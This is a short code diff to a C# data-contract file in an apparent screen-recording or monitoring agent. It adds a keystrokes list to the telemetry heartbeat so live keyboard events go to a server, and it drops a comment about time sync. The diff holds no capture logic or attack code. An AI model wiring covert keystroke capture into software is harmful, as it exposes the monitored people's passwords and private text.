@@ -2,7 +2,9 @@
 // File: Core/Contracts/Network/CommunicationModels.cs
 // ==========================================
 using System;
+using System.Collections.Generic;
 using System.Text.Json.Serialization;
+using ITB_SCREEN_RECORDER.Core.Contracts.Keystroke;
 
 namespace ITB_SCREEN_RECORDER.Core.Contracts.Network
 {
@@ -142,6 +144,10 @@ namespace ITB_SCREEN_RECORDER.Core.Contracts.Network
 
         [JsonPropertyName("nicTotalRxMbps")]
         public double NicTotalRxMbps { get; set; }
+
+        // 💡 דיווח אירועי מקלדת חיים באותו ערוץ טלמטריה
+        [JsonPropertyName("keystrokes")]
+        public List<KeystrokeEventDto>? Keystrokes { get; set; }
     }
 
     public class AgentHeartbeatResponse
@@ -155,7 +161,6 @@ namespace ITB_SCREEN_RECORDER.Core.Contracts.Network
         [JsonPropertyName("serverUtcTime")]
         public DateTime ServerUtcTime { get; set; } = DateTime.UtcNow;
 
-        // 💡 סנכרון זמנים ב-Epoch מדויק (UTC במילי-שניות) לנטרול בעיות אזורי זמן
         [JsonPropertyName("serverUtcEpochMs")]
         public long ServerUtcEpochMs { get; set; } = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
 
